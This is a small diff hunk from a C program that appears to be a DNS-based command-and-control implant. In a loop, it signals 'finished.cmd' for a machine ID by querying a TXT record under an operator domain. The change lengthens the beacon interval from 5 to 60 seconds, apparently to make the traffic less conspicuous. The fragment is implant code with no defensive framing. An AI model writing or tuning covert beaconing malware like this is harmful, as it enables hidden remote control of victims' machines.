@@ -176,7 +176,7 @@ int main() {
             snprintf(fqdn, sizeof(fqdn), "finished.cmd.%s.%s", id_machine, BASE_DOMAIN);
             get_dns_txt_record(fqdn, NULL, 0);
         }
-        sleep(5);
+        sleep(60);
     }
     free(cmd_output);
     return 0;
